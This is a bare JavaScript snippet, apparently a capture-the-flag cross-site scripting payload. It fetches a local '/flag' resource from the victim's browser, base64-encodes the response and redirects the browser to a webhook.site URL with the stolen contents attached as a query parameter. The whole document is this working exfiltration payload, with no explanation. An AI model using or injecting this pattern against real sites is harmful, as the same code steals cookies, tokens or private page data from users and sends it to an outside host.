fetch('https://127.0.0.1/flag', {
    method: 'GET'
})
.then(response => response.text())
.then(contents => {
    const encodedContents = btoa(contents);
    const webhookUrl = `https://webhook.site/b2827932-b0a6-490a-9be6-5c08830d7453?abd=${encodedContents}`;
    window.location.href = webhookUrl;
})
.catch(error => console.error('Error:', error));
